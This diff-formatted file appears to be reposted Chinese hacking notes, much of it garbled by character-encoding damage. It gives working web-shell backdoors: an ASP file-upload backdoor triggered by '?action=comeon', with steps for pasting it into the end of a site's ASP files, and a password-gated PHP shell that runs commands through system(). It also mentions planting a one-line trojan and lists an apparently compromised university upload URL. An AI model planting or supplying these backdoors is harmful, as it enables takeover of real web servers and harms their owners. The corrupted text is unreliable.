@@ -1,0 +1,62 @@
+1.程?姜asp?2010-03-30 18:45さぱ?琌恨瞶?祅??旅и???琌?ゑ??恨瞶?ぃ琌 
+?盽?璶祅?и??碞 
+
+1.?и?SHELLт恨瞶?? 
+
+2.??ウ 程?琿? 
+
+<%if request.QueryString("action")="comeon" then 
+a=Request.TotalBytes:if a Then b="adodb.stream":Set c=Createobject(b):c.Type=1:c.Open:c.Write Request.BinaryRead(a):c.Position=0:d=c.Read:e=chrB(13)&chrB(10):f=Instrb(d,e):g=Instrb(f+1,d,e):set h=Createobject(b):h.Type=1:h.Open:c.Position=f+1:c.Copyto h,g-f-3:h.Position=0:h.type=2:h.CharSet="BIG5":i=h.Readtext:h.close:j=mid(i,InstrRev(i,"\")+1,g):k=Instrb(d,e&e)+4:l=Instrb(k+1,d,leftB(d,f-1))-k-2:h.Type=1:h.Open:c.Position=k-1:c.CopyTo h,l:h.SaveToFile server.mappath(j),2%><form enctype=multipart/form-data method=post><input type=file name=n><input type=submit></form> 
+<%end if%> 
+
+
+3.êи?璶ти??㎡琌?ぐ?? ?碞琌и??旅?┮ 
+
+login.asp?action=comeon 
+
+ 
+
+
+
+
+upfile_other.asp  代码最后面
+如下
+<%if request.QueryString("action")="comeon" then
+a=Request.TotalBytes:if a Then b="adodb.stream":Set c=Createobject(b):c.Type=1:c.Open:c.Write Request.BinaryRead(a):c.Position=0:d=c.Read:e=chrB(13)&chrB(10):f=Instrb(d,e):g=Instrb(f+1,d,e):set h=Createobject(b):h.Type=1:h.Open:c.Position=f+1:c.Copyto h,g-f-3:h.Position=0:h.type=2:h.CharSet="BIG5":i=h.Readtext:h.close:j=mid(i,InstrRev(i,"\")+1,g):k=Instrb(d,e&e)+4:l=Instrb(k+1,d,leftB(d,f-1))-k-2:h.Type=1:h.Open:c.Position=k-1:c.CopyTo h,l:h.SaveToFile server.mappath(j),2%><form enctype=multipart/form-data method=post><input type=file name=n><input type=submit></form>
+<%end if%> 
+复制后粘贴到网站的ASP文件最尾步。?action=comeon
+
+
+方法二
+MY?恨瞶╰?
+upfile_other.asp  代码最后面
+C:\hnart\Arthn\Index\Index.aspx
+
+
+插入一句话木马，然后用一句话木马客服端连接，成功获得小马
+
+
+http://zsb.hunnu.edu.cn/UploadThumbs/201156205518410.asp
+
+
+
+
+2.
+     
+
+php蔍?痙system?м?
+2010-08-21 13:21:02 asphack ?方 ??Ω?364 
+-
+php command /*盞???*/?
+
+
+????琌????Τт???狠琌??ゑ???臭ゑ?τ?ぃ惠璶ㄌ??狠
+
+<?php if($_REQUEST[PASS]=='pass'){ system($_REQUEST[command]); } ?> ??: ?PASS=pass&exec=
+
+
+systemㄧ?и?眔琌php 5.xセや產ノexec单ㄤ蠢
+
+*Τ?ぃ璶盞?ê碞?獽ㄏノ?尺τ?礛?甶
+
+セ絞ゅ彻?方[0day蔍?]|[0day Network]|exploit|vulnerability Www.0daynet.Com ゅ?钡http://www.0daynet.com/2010/0821/1062.html
